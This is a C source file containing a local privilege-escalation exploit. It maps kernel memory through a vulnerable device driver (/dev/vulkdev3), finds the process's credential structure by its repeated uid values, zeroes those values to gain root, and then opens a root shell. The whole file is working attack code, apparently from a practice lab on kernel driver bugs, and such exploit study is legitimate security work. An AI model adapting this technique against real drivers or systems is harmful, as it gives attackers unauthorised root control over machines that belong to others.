#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

#define VULKDEV_DEVICE "/dev/vulkdev3"

#define MMAP_START  0x42424000
#define MMAP_SIZE   0x26000000   // 0x7EEFFFFF
#define MMAP_OFFSET 0x80000000

int kernel_mmap2(int argc, char* argv[])
{
	int fd;
	uid_t uid;
	unsigned int *addr;
	unsigned long start;

	fd = open(VULKDEV_DEVICE, O_RDWR);
	if (fd < 0) {
		printf("open vulkdev fail!\n");
		exit(1);
	}

	addr = (unsigned int *)mmap((void *)MMAP_START, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, MMAP_OFFSET);
	if (addr == MAP_FAILED) {
		printf("mmap failed, errno = %d\n", errno);
		close(fd);
		return -1;
	}
	start = (unsigned long)addr;
	printf("mmap addr: %lx\n", start);
	uid = getuid();
	printf("uid = %d\n", uid);

	unsigned int num = 0;
	while ((unsigned long)addr < start + MMAP_SIZE - 0x40) {
		unsigned int idx = 0;
		if (addr[idx++] == uid &&
			addr[idx++] == uid &&
			addr[idx++] == uid &&
			addr[idx++] == uid &&
			addr[idx++] == uid &&
			addr[idx++] == uid &&
			addr[idx++] == uid &&
			addr[idx++] == uid) {
			printf("find cred structure, ptr=%p, num=%d\n", addr, ++num);

			idx = 0;
			addr[idx++] = 0;
			addr[idx++] = 0;
			addr[idx++] = 0;
			addr[idx++] = 0;
			addr[idx++] = 0;
			addr[idx++] = 0;
			addr[idx++] = 0;
			addr[idx++] = 0;
			
			if (getuid() == 0) {
				printf("GOT ROOT!\n");
				break;
			} else {
				idx = 0;
				addr[idx++] = uid;
				addr[idx++] = uid;
				addr[idx++] = uid;
				addr[idx++] = uid;
				addr[idx++] = uid;
				addr[idx++] = uid;
				addr[idx++] = uid;
				addr[idx++] = uid;
			}
		}
		addr++;
	}
	printf("loop end\n");
	if (getuid() == 0)
		execl("/bin/sh", "sh", NULL);
	return 0;
}

